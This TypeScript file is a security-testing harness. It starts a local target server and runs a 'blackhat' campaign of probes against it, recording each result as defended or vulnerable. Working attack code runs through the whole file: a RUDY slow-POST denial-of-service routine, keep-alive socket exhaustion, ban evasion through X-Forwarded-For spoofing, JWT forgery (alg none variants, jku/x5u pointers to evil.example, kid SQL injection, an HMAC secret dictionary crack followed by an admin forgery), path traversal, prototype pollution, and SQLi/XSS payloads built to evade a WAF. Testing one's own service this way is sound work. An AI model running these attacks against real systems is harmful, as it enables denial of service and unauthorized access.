/**
 * BLACKHAT ATTACKS — a former-blackhat's supplemental campaign.
 * =============================================================
 *
 * Written fresh for this engagement. Every probe here is a vector that is NOT
 * covered by run.ts / custom-attacks.ts / extended-attacks.ts:
 *
 *   - RUDY (R-U-Dead-Yet): slow-POST body dribble (slowloris' lesser-known twin)
 *   - Idle keep-alive connection exhaustion
 *   - Auto-ban evasion via X-Forwarded-For rotation
 *   - HTTP verb tampering: HEAD / CONNECT / OPTIONS * / PROPFIND / PURGE
 *   - Route case confusion (/ADMIN) and matrix-parameter smuggling (;role=admin)
 *   - JWT: alg case variants, non-string alg, jku/x5u pointer injection,
 *     HS384/HS512 cross-alg, and an OFFLINE dictionary attack on the HMAC secret
 *   - WebSocket same-origin bypasses: trailing-dot host, uppercase scheme,
 *     Origin: null, Origin header omitted entirely
 *   - UTF-16 charset body smuggling with a prototype-pollution payload
 *   - Overlong UTF-8 dot-segments on the except() app (%c0%ae%c0%ae)
 *   - except() case-matching bypass (/PUBLIC/../api/admin)
 *   - Credential smuggling: Bearer in query string / Cookie
 *   - JSON batch (array) body against a strict object schema
 *   - Content-Encoding: br (brotli) confusion on the decompression route
 *   - WAF evasion follow-ups: tabs/newlines/nulls inside SQLi, mixed-case XSS,
 *     fullwidth Unicode homoglyphs — extending the one finding the documented
 *     suite surfaced
 *   - Multiple Authorization headers over a raw socket
 *   - Timing side-channel on basic-auth (unknown user vs wrong password)
 *
 * Same ground rules as the other harnesses: the target runs in a SEPARATE
 * process; exit code is non-zero if any finding is VULNERABLE.
 */

import { spawn } from "node:child_process";
import net from "node:net";
import { createHmac, timingSafeEqual } from "node:crypto";
import { fileURLToPath } from "node:url";

const HOST = "127.0.0.1";
type Verdict = "DEFENDED" | "VULNERABLE" | "INFO";
interface Finding {
  category: string;
  title: string;
  severity: "critical" | "high" | "medium" | "low" | "info";
  attack: string;
  observed: string;
  verdict: Verdict;
}
const findings: Finding[] = [];
const record = (f: Finding) => findings.push(f);

let BASE = "";
let BASE_B = "";

// ---------------------------------------------------------------------------
// Wire primitives
// ---------------------------------------------------------------------------

interface Res {
  status: number;
  headers: Headers;
  text: string;
}
async function http(
  method: string,
  path: string,
  opts: { headers?: Record<string, string>; body?: string | Uint8Array } = {}
): Promise<Res> {
  const res = await fetch(BASE + path, {
    method,
    headers: opts.headers,
    body: opts.body as any,
    redirect: "manual",
  });
  return { status: res.status, headers: res.headers, text: await res.text() };
}

function rawSend(
  port: number,
  payload: string,
  waitMs = 1500
): Promise<{ raw: string; statusLine: string; status: number }> {
  return new Promise((resolve) => {
    const sock = net.connect(port, HOST);
    let buf = "";
    const finish = () => {
      try {
        sock.destroy();
      } catch {
        /* ignore */
      }
      const statusLine = buf.split("\r\n")[0] ?? "";
      const m = /HTTP\/\d\.\d\s+(\d{3})/.exec(statusLine);
      resolve({ raw: buf, statusLine, status: m ? Number(m[1]) : 0 });
    };
    sock.setTimeout(waitMs);
    sock.on("connect", () => sock.write(payload));
    sock.on("data", (d) => {
      buf += d.toString("latin1");
    });
    sock.on("timeout", finish);
    sock.on("close", finish);
    sock.on("error", finish);
  });
}

/** R-U-Dead-Yet: finish the headers, then drip the body one byte at a time. */
function rudy(port: number, holdMs: number): Promise<{ closedByServer: boolean; afterMs: number }> {
  return new Promise((resolve) => {
    const sock = net.connect(port, HOST);
    const t0 = Date.now();
    let settled = false;
    const done = (closedByServer: boolean) => {
      if (settled) return;
      settled = true;
      try {
        sock.destroy();
      } catch {
        /* ignore */
      }
      resolve({ closedByServer, afterMs: Date.now() - t0 });
    };
    sock.on("connect", () => {
      sock.write(
        "POST /sink HTTP/1.1\r\nHost: t\r\nContent-Type: application/json\r\nContent-Length: 2000\r\n\r\n{"
      );
      const iv = setInterval(() => {
        if (settled) return clearInterval(iv);
        try {
          sock.write(" ");
        } catch {
          clearInterval(iv);
        }
      }, 400);
    });
    sock.on("close", () => done(true));
    sock.on("error", () => done(true));
    setTimeout(() => done(false), holdMs);
  });
}

function wsHandshake(
  port: number,
  origin?: string
): Promise<{ status: number; statusLine: string }> {
  const lines = [
    "GET /ws HTTP/1.1",
    `Host: 127.0.0.1:${port}`,
    "Upgrade: websocket",
    "Connection: Upgrade",
    "Sec-WebSocket-Key: MDEyMzQ1Njc4OWFiY2RlZg==",
    "Sec-WebSocket-Version: 13",
  ];
  if (origin !== undefined) lines.push(`Origin: ${origin}`);
  return rawSend(port, lines.join("\r\n") + "\r\n\r\n", 1500).then((r) => ({
    status: r.status,
    statusLine: r.statusLine,
  }));
}

const seg = (o: unknown) => Buffer.from(JSON.stringify(o)).toString("base64url");
const forgeJwt = (header: unknown, payload: unknown, sig = "AAAA") =>
  `${seg(header)}.${seg(payload)}.${sig}`;
const signJwt = (header: object, payload: object, key: string) => {
  const data = `${seg(header)}.${seg(payload)}`;
  const sig = createHmac("sha256", key).update(data).digest("base64url");
  return `${data}.${sig}`;
};

// ---------------------------------------------------------------------------
// Campaigns
// ---------------------------------------------------------------------------

async function dosRudyAndKeepAlive(port: number) {
  const cat = "DoS (RUDY / keep-alive)";

  // Slowloris dribbles HEADERS. RUDY completes them and dribbles the BODY —
  // a different parser state, and classic slowloris defenses sometimes miss it.
  const r = await rudy(port, 6000);
  record({
    category: cat,
    title: "RUDY slow-POST body dribble",
    severity: "high",
    attack: "POST /sink, complete headers + Content-Length: 2000, then 1 byte / 400ms",
    observed: r.closedByServer
      ? `server cut the stalled body after ${r.afterMs}ms`
      : `socket still open after ${r.afterMs}ms`,
    verdict: r.closedByServer ? "DEFENDED" : "VULNERABLE",
  });

  // Exhaust the accept table with idle keep-alive sockets: full valid request,
  // response consumed, socket held open doing nothing.
  const socks: net.Socket[] = [];
  await Promise.all(
    Array.from({ length: 80 }, () =>
      http("GET", "/healthz").then(() => {
        /* fetch() pools; open raw holders below instead */
      })
    )
  );
  for (let i = 0; i < 80; i++) {
    const s = net.connect(port, HOST);
    s.on("connect", () => s.write("GET /healthz HTTP/1.1\r\nHost: t\r\n\r\n"));
    s.on("error", () => {});
    socks.push(s);
  }
  await new Promise((r2) => setTimeout(r2, 2500));
  let alive = false;
  try {
    alive = (await http("GET", "/healthz")).status === 200;
  } catch {
    alive = false;
  }
  for (const s of socks) {
    try {
      s.destroy();
    } catch {
      /* ignore */
    }
  }
  record({
    category: cat,
    title: "Idle keep-alive connection hoarding (80 held sockets)",
    severity: "medium",
    attack: "80 sockets send a full request then sit idle on keep-alive",
    observed: alive
      ? "server still responsive while sockets held"
      : "TARGET STARVED — connection refused",
    verdict: alive ? "DEFENDED" : "VULNERABLE",
  });
}

async function banEvasion() {
  const cat = "Brute force / ban evasion";
  // autoBan keys strikes on X-Forwarded-For (the target opted into
  // trustProxyHeaders). An attacker who can influence that header rotates it
  // and never accumulates strikes.
  const codes: number[] = [];
  for (let i = 1; i <= 10; i++) {
    codes.push(
      (await http("GET", "/ab-login", { headers: { "x-forwarded-for": `10.66.0.${i}` } })).status
    );
  }
  const stillOpen = (
    await http("GET", "/ab-public", { headers: { "x-forwarded-for": "10.66.0.11" } })
  ).status;
  const banned = codes.includes(429) || stillOpen === 429;
  record({
    category: cat,
    title: "Auto-ban evasion via X-Forwarded-For rotation",
    severity: "medium",
    attack: "10 failed /ab-login, each from a different spoofed XFF IP",
    observed: `strikes ${codes.join(",")}, 11th IP on /ab-public → ${stillOpen}`,
    // NOTE: defended only if a real proxy overwrites XFF. With trustProxyHeaders
    // the framework trusts the header by design — flag as INFO, not a vuln.
    verdict: banned ? "DEFENDED" : "INFO",
  });
}

async function verbTampering(port: number) {
  const cat = "Verb tampering / route confusion";

  // HEAD must not execute the GET handler's auth hook differently.
  const head = await http("HEAD", "/admin");
  record({
    category: cat,
    title: "HEAD /admin without credentials",
    severity: "high",
    attack: "HEAD /admin (no Authorization) — classic auth-hook bypass",
    observed: `status ${head.status}`,
    verdict:
      head.status === 401 || head.status === 404 || head.status === 405 ? "DEFENDED" : "VULNERABLE",
  });

  for (const m of ["PROPFIND", "PURGE", "MKCOL", "ARBITRARY"]) {
    const r = await http(m, "/admin");
    record({
      category: cat,
      title: `Exotic method ${m} on /admin`,
      severity: "medium",
      attack: `${m} /admin (no credentials)`,
      observed: `status ${r.status}`,
      verdict: r.status >= 400 && r.status < 500 ? "DEFENDED" : "VULNERABLE",
    });
  }

  // CONNECT — try to turn the origin server into a proxy tunnel.
  const conn = await rawSend(port, "CONNECT 169.254.169.254:80 HTTP/1.1\r\nHost: t\r\n\r\n");
  record({
    category: cat,
    title: "CONNECT proxy-tunnel abuse",
    severity: "high",
    attack: "CONNECT 169.254.169.254:80 HTTP/1.1",
    observed: `response: ${conn.statusLine || "(dropped)"}`,
    // Node destroys the socket for an unhandled CONNECT — dropped = defended.
    verdict: conn.status === 200 ? "VULNERABLE" : "DEFENDED",
  });

  // OPTIONS * (asterisk-form) — must not crash or leak.
  const ast = await rawSend(port, "OPTIONS * HTTP/1.1\r\nHost: t\r\n\r\n");
  record({
    category: cat,
    title: "Asterisk-form OPTIONS * request target",
    severity: "low",
    attack: "OPTIONS * HTTP/1.1",
    observed: `response: ${ast.statusLine || "(dropped)"}`,
    verdict: ast.status >= 500 ? "VULNERABLE" : "INFO",
  });

  // Route case confusion — /ADMIN must not match the /admin route (and its hook).
  for (const p of ["/ADMIN", "/Admin", "/admin/", "/admin.json", "/users/1;role=admin"]) {
    const r = await http("GET", p);
    record({
      category: cat,
      title: `Route confusion via ${p}`,
      severity: "medium",
      attack: `GET ${p} (no credentials)`,
      observed: `status ${r.status}` + (r.text.includes("TOP-SECRET") ? " — SECRET LEAKED" : ""),
      verdict: r.text.includes("TOP-SECRET") ? "VULNERABLE" : "DEFENDED",
    });
  }
}

async function jwtDeepDive() {
  const cat = "JWT deep dive";

  // Get a real user token first (login is rate-limited to 5/min, use 1).
  const login = await http("POST", "/login", {
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ user: "alice", pass: "correct-horse-battery" }),
  });
  let userToken = "";
  try {
    userToken = JSON.parse(login.text).token ?? "";
  } catch {
    /* ignore */
  }

  const payload = { sub: "alice", scopes: ["admin"], exp: Math.floor(Date.now() / 1000) + 600 };

  // alg case variants and non-string alg values.
  for (const [label, header] of [
    ['alg "NONE" (uppercase)', { alg: "NONE", typ: "JWT" }],
    ['alg "nOnE"', { alg: "nOnE" }],
    ["alg as array", { alg: ["HS256"] }],
    ["alg as null", { alg: null }],
    ["jku pointer injection", { alg: "HS256", jku: "http://evil.example/jwks.json", kid: "k1" }],
    ["x5u pointer injection", { alg: "HS256", x5u: "http://evil.example/cert.pem" }],
    ["kid SQLi", { alg: "HS256", kid: "k' UNION SELECT 'AAAA'--" }],
  ] as const) {
    const r = await http("GET", "/admin", {
      headers: { authorization: `Bearer ${forgeJwt(header, payload)}` },
    });
    record({
      category: cat,
      title: `JWT ${label}`,
      severity: "critical",
      attack: `GET /admin with forged header ${JSON.stringify(header).slice(0, 60)}`,
      observed: `status ${r.status}` + (r.text.includes("TOP-SECRET") ? " — SECRET LEAKED" : ""),
      verdict: !r.text.includes("TOP-SECRET") && r.status >= 400 ? "DEFENDED" : "VULNERABLE",
    });
  }

  // Cross-algorithm: HS384/HS512 digests are longer; a sloppy verifier that
  // only checks "HMAC family" might accept them with the same key.
  for (const alg of ["HS384", "HS512"]) {
    const t = `${seg({ alg, typ: "JWT" })}.${seg(payload)}.${"A".repeat(alg === "HS384" ? 64 : 86)}`;
    const r = await http("GET", "/admin", { headers: { authorization: `Bearer ${t}` } });
    record({
      category: cat,
      title: `JWT cross-algorithm ${alg} against an HS256-only verifier`,
      severity: "high",
      attack: `GET /admin with an ${alg} token`,
      observed: `status ${r.status}`,
      verdict: r.status >= 400 && !r.text.includes("TOP-SECRET") ? "DEFENDED" : "VULNERABLE",
    });
  }

  // THE classic: offline dictionary attack on the HMAC secret. If the secret
  // is weak, any captured user token yields full key recovery → forge admin.
  let cracked: string | null = null;
  if (userToken) {
    const [, payloadB64] = userToken.split(".");
    const weakList = [
      "secret",
      "password",
      "123456",
      "changeme",
      "jwt-secret",
      "supersecret",
      "your-256-bit-secret",
      "secretkey",
      "mysecret",
      "letmein",
      "admin",
      "keyboard-cat",
      "correct-horse-battery",
      "shhhhh",
      "topsecret",
    ];
    const [h, p, s] = userToken.split(".");
    for (const guess of weakList) {
      const cand = createHmac("sha256", guess).update(`${h}.${p}`).digest();
      const real = Buffer.from(s!, "base64url");
      if (cand.length === real.length && timingSafeEqual(cand, real)) {
        cracked = guess;
        break;
      }
    }
    void payloadB64;
  }
  record({
    category: cat,
    title: "Offline dictionary attack on the HS256 secret (key recovery)",
    severity: "critical",
    attack: "Capture a live user token, HMAC it against a 15-entry weak-secret wordlist",
    observed: cracked
      ? `SECRET CRACKED: "${cracked}" — full token forgery possible`
      : "no wordlist match; secret not in common-password space",
    verdict: cracked ? "VULNERABLE" : "DEFENDED",
  });

  // If cracked, forge admin to prove end-to-end compromise.
  if (cracked) {
    const forged = signJwt({ alg: "HS256", typ: "JWT" }, payload, cracked);
    const r = await http("GET", "/admin", { headers: { authorization: `Bearer ${forged}` } });
    record({
      category: cat,
      title: "Admin forgery with the cracked secret (proof of compromise)",
      severity: "critical",
      attack: "Sign scopes:[admin] with the recovered key",
      observed: `status ${r.status}` + (r.text.includes("TOP-SECRET") ? " — SECRET LEAKED" : ""),
      verdict: r.text.includes("TOP-SECRET") ? "VULNERABLE" : "DEFENDED",
    });
  }
}

async function wsOriginTricks(port: number) {
  const cat = "WebSocket origin evasion";
  const cases: Array<[string, string | undefined, boolean]> = [
    ["trailing-dot host", "http://127.0.0.1.:" + port, false],
    ["uppercase scheme+host", `HTTP://127.0.0.1:${port}`, true], // same origin, case-insensitive — accept is fine
    ["Origin: null", "null", false],
    ["evil subdomain of nothing", "https://127.0.0.1.evil.example", false],
    ["Origin header omitted", undefined, true], // non-browser clients have no Origin — must still work
  ];
  for (const [label, origin, acceptOk] of cases) {
    const r = await wsHandshake(port, origin);
    const accepted = r.status === 101;
    const ok = acceptOk ? accepted : !accepted;
    record({
      category: cat,
      title: `WS handshake with ${label}`,
      severity: acceptOk ? "info" : "high",
      attack: `WS upgrade, ${origin === undefined ? "no Origin header" : `Origin: ${origin}`}`,
      observed: `handshake: ${r.statusLine || "(dropped)"} — ${accepted ? "ACCEPTED" : "rejected"}`,
      verdict: ok ? "DEFENDED" : acceptOk ? "INFO" : "VULNERABLE",
    });
  }
}

async function charsetAndEncodingSmuggling() {
  const cat = "Charset / encoding smuggling";

  // Declare UTF-16 and ship a UTF-16 prototype-pollution payload. A parser that
  // honors the charset naively, or a WAF that only scans UTF-8, can miss it.
  const utf16 = Buffer.from('{"name":"x","price":1,"__proto__":{"polluted":"utf16"}}', "utf16le");
  const r = await http("POST", "/items", {
    headers: { "content-type": "application/json; charset=utf-16" },
    body: utf16,
  });
  const healthy = (await http("GET", "/healthz")).status === 200;
  record({
    category: cat,
    title: "UTF-16 charset body smuggling (proto pollution payload)",
    severity: "high",
    attack: "POST /items, Content-Type: application/json; charset=utf-16, UTF-16LE bytes",
    observed: `status ${r.status}, server healthy: ${healthy}`,
    verdict: healthy && !r.text.includes("polluted") ? "DEFENDED" : "VULNERABLE",
  });

  // Brotli content-encoding on the decompression route — if the middleware
  // silently passes it through, the JSON parser chokes on binary (fine); the
  // danger is an unguarded brotli inflate bomb.
  const br = await http("POST", "/ingest", {
    headers: { "content-type": "application/json", "content-encoding": "br" },
    body: new Uint8Array([0x1b, 0x03, 0x00, 0x00, 0x00]),
  });
  record({
    category: cat,
    title: "Content-Encoding: br confusion on the decompression route",
    severity: "medium",
    attack: "POST /ingest with content-encoding: br and junk bytes",
    observed: `status ${br.status}`,
    verdict:
      br.status === 400 || br.status === 413 || br.status === 415 || br.status === 422
        ? "DEFENDED"
        : "INFO",
  });
}

async function traversalRoundTwo(portB: number) {
  const cat = "Path traversal, round two";

  // Overlong (invalid) UTF-8 encoding of '.' — %c0%ae. Byte-level filters see
  // harmless bytes; a lenient decoder turns them into dot-segments.
  const overlong = await rawSend(
    portB,
    "GET /public/%c0%ae%c0%ae/api/admin HTTP/1.1\r\nHost: t\r\n\r\n"
  );
  record({
    category: cat,
    title: "Overlong UTF-8 dot-segment traversal (%c0%ae%c0%ae)",
    severity: "critical",
    attack: "GET /public/%c0%ae%c0%ae/api/admin on the except() app",
    observed: `response: ${overlong.statusLine || "(dropped)"}`,
    verdict: overlong.status === 200 ? "VULNERABLE" : "DEFENDED",
  });

  // Case-matching mismatch between except() and the router.
  for (const p of ["/PUBLIC/../api/admin", "/Public/../api/admin"]) {
    const r = await fetch(BASE_B + p, { redirect: "manual" });
    record({
      category: cat,
      title: `except() case-matching bypass (${p.split("/")[1]})`,
      severity: "critical",
      attack: `GET ${p} — if except() is case-insensitive but the router resolves ../, auth is skipped`,
      observed: `status ${r.status}`,
      verdict: r.status === 200 ? "VULNERABLE" : "DEFENDED",
    });
  }
}

async function credentialSmuggling() {
  const cat = "Credential smuggling";

  // Tokens must only be honored in the Authorization header.
  const q = await http("GET", "/admin?access_token=anything&token=anything");
  record({
    category: cat,
    title: "Bearer token in the query string",
    severity: "medium",
    attack: "GET /admin?access_token=… (token in URL — leaks into logs/proxies)",
    observed: `status ${q.status}`,
    verdict: q.status === 401 ? "DEFENDED" : "VULNERABLE",
  });

  const c = await http("GET", "/admin", {
    headers: { cookie: "token=forged; access_token=forged" },
  });
  record({
    category: cat,
    title: "Bearer token smuggled in a Cookie",
    severity: "medium",
    attack: "GET /admin with Cookie: token=forged",
    observed: `status ${c.status}`,
    verdict: c.status === 401 ? "DEFENDED" : "VULNERABLE",
  });

  // Two Authorization headers on one request — Node joins them with a comma.
  // A verifier that doesn't reject the joined form could be confused.
  const dup = await http("GET", "/admin", {
    headers: { authorization: "Bearer AAAA, Bearer BBBB" },
  });
  record({
    category: cat,
    title: "Duplicate Authorization headers (comma-joined)",
    severity: "medium",
    attack: "GET /admin with two Authorization headers",
    observed: `status ${dup.status}`,
    verdict:
      dup.status === 401 || dup.status === 403 || dup.status === 400 ? "DEFENDED" : "VULNERABLE",
  });
}

async function jsonShapeAbuse() {
  const cat = "JSON shape abuse";

  // Batch/array body against a strict object schema.
  const arr = await http("POST", "/items", {
    headers: { "content-type": "application/json" },
    body: JSON.stringify([
      { name: "a", price: 1 },
      { name: "b", price: 2, isAdmin: true },
    ]),
  });
  record({
    category: cat,
    title: "JSON batch (top-level array) against an object schema",
    severity: "medium",
    attack: "POST /items with [{…},{…,isAdmin:true}]",
    observed:
      `status ${arr.status}` + (arr.text.includes("isAdmin") ? " — smuggled field echoed" : ""),
    verdict:
      (arr.status === 400 || arr.status === 422) && !arr.text.includes("isAdmin")
        ? "DEFENDED"
        : arr.status < 300 && !arr.text.includes("isAdmin")
          ? "DEFENDED"
          : "VULNERABLE",
  });

  // Wrapped object: {"body": {...}} / {"items": {...}} — envelope confusion.
  const env = await http("POST", "/items", {
    headers: { "content-type": "application/json" },
    body: JSON.stringify({ name: "x", price: 1, items: [{ role: "admin" }] }),
  });
  record({
    category: cat,
    title: "Nested envelope with privileged sub-object",
    severity: "low",
    attack: "POST /items {name, price, items:[{role:'admin'}]}",
    observed: `status ${env.status}` + (env.text.includes("role") ? " — nested field echoed" : ""),
    verdict: !env.text.includes("role") ? "DEFENDED" : "VULNERABLE",
  });
}

async function wafEvasionFollowUps() {
  const cat = "WAF evasion follow-ups";
  // The documented suite already proved one nested-comment bypass. Map the
  // boundary of that weakness: which obfuscations still get 403, which sail
  // through to the handler?
  const probes: Array<[string, string]> = [
    ["tab-separated SQLi", "1'\tOR\t1=1"],
    ["newline-separated SQLi", "1'\nOR\n1=1"],
    ["null byte inside SQLi", "1'%00OR%001=1"],
    ["hash comment", "1' OR 1=1#"],
    ["mixed-case XSS", "<ScRiPt>alert(1)</ScRiPt>"],
    ["event-handler XSS", "<img src=x onerror=alert(1)>"],
    ["svg XSS", "<svg onload=alert(1)>"],
    ["fullwidth homoglyph SQL", "ｕｎｉｏｎ ｓｅｌｅｃｔ password"],
    ["union select", "1 UNION SELECT password FROM users"],
    ["double nested comment", "1/**//**/OR/**//**/1=1"],
    ["select in parens", "1 OR (SELECT 1)"],
    ["encoded comment open", "1%2F%2A%2A%2FOR%2F%2A%2A%2F1=1"],
  ];
  for (const [label, q] of probes) {
    const r = await http("GET", `/search?q=${encodeURIComponent(q)}`);
    // /search echoes input — the only question is whether the WAF let it reach
    // the handler (200) or blocked it (403). Fullwidth homoglyphs used to
    // evade the ASCII-only signatures; NFKC inspection variants now fold
    // them, so they are expected DEFENDED like every other probe here.
    record({
      category: cat,
      title: `WAF: ${label}`,
      severity: "medium",
      attack: `GET /search?q=${q}`,
      observed: `status ${r.status}`,
      verdict: r.status === 403 ? "DEFENDED" : r.status === 200 ? "VULNERABLE" : "INFO",
    });
  }
}

async function timingSideChannel() {
  const cat = "Side channels";
  const basic = (u: string, p: string) => `Basic ${Buffer.from(`${u}:${p}`).toString("base64")}`;
  const sample = async (auth: string, n: number) => {
    const ts: number[] = [];
    for (let i = 0; i < n; i++) {
      const t0 = performance.now();
      await http("GET", "/basic-vault", { headers: { authorization: auth } });
      ts.push(performance.now() - t0);
    }
    ts.sort((a, b) => a - b);
    return ts[Math.floor(ts.length / 2)]!; // median
  };
  const unknown = await sample(basic("nobody-real", "x"), 30);
  const wrongPass = await sample(basic("alice", "WRONG"), 30);
  const diff = Math.abs(unknown - wrongPass);
  record({
    category: cat,
    title: "Basic-auth user-enumeration timing channel",
    severity: "low",
    attack: "30× unknown-user vs 30× known-user-wrong-password, compare medians",
    observed: `median unknown=${unknown.toFixed(1)}ms, wrong-pass=${wrongPass.toFixed(1)}ms, Δ=${diff.toFixed(1)}ms`,
    // Localhost noise dominates; >5ms median gap would be a real signal.
    verdict: diff > 5 ? "VULNERABLE" : "DEFENDED",
  });
}

// ---------------------------------------------------------------------------
// Harness plumbing
// ---------------------------------------------------------------------------

function report(): number {
  let defended = 0,
    vulnerable = 0,
    info = 0;
  let currentCat = "";
  for (const f of findings) {
    if (f.category !== currentCat) {
      currentCat = f.category;
      console.log(`\n▼ ${currentCat}`);
    }
    const icon = f.verdict === "VULNERABLE" ? "🔴" : f.verdict === "INFO" ? "ℹ️ " : "✅";
    console.log(`  ${icon} [${f.verdict}] ${f.title}  (${f.severity})`);
    console.log(`       attack:   ${f.attack}`);
    console.log(`       observed: ${f.observed}`);
    if (f.verdict === "VULNERABLE") vulnerable++;
    else if (f.verdict === "INFO") info++;
    else defended++;
  }
  console.log("\n" + "═".repeat(80));
  console.log(
    `  BLACKHAT SUMMARY: ${defended} DEFENDED · ${vulnerable} VULNERABLE · ${info} INFO  (of ${findings.length} probes)`
  );
  console.log(
    vulnerable
      ? "  VERDICT: weaknesses found — see 🔴 findings above."
      : "  VERDICT: no exploitable weakness in this campaign."
  );
  console.log("═".repeat(80));
  return vulnerable ? 1 : 0;
}

async function startTarget(): Promise<{ port: number; portB: number; kill: () => void }> {
  const targetPath = fileURLToPath(new URL("target.ts", import.meta.url));
  const child = spawn("node", ["--import", "tsx", targetPath], {
    stdio: ["inherit", "pipe", "pipe"],
  });
  let stderr = "";
  return new Promise((resolve, reject) => {
    const timer = setTimeout(
      () => reject(new Error("target did not announce readiness\n" + stderr)),
      30_000
    );
    let buf = "";
    child.stdout!.on("data", (d) => {
      buf += d.toString();
      const m = /RED_TEAM_TARGET_READY (\d+) (\d+)/.exec(buf);
      if (m) {
        clearTimeout(timer);
        resolve({ port: Number(m[1]), portB: Number(m[2]), kill: () => child.kill("SIGKILL") });
      }
    });
    child.stderr!.on("data", (d) => {
      stderr += d.toString();
    });
    child.on("exit", (code) => {
      clearTimeout(timer);
      reject(new Error(`target exited early (code ${code})\n${stderr}`));
    });
  });
}

async function main() {
  console.log("🕶️  Blackhat supplemental campaign — spinning up the target…");
  const { port, portB, kill } = await startTarget();
  BASE = `http://${HOST}:${port}`;
  BASE_B = `http://${HOST}:${portB}`;
  console.log(`🎯  Target live on ${BASE} / ${BASE_B} — commencing undocumented attacks.\n`);

  try {
    await dosRudyAndKeepAlive(port);
    await banEvasion();
    await verbTampering(port);
    await jwtDeepDive();
    await wsOriginTricks(port);
    await charsetAndEncodingSmuggling();
    await traversalRoundTwo(portB);
    await credentialSmuggling();
    await jsonShapeAbuse();
    await wafEvasionFollowUps();
    await timingSideChannel();
  } finally {
    let alive = false;
    try {
      alive = (await http("GET", "/healthz")).status === 200;
    } catch {
      alive = false;
    }
    record({
      category: "Resilience",
      title: "Target process survived the blackhat campaign",
      severity: "critical",
      attack: "post-engagement liveness probe",
      observed: alive ? "target still serving" : "TARGET DOWN — connection refused",
      verdict: alive ? "DEFENDED" : "VULNERABLE",
    });
    kill();
  }

  process.exit(report());
}

main().catch((e) => {
  console.error("engagement aborted:", e);
  process.exit(2);
});
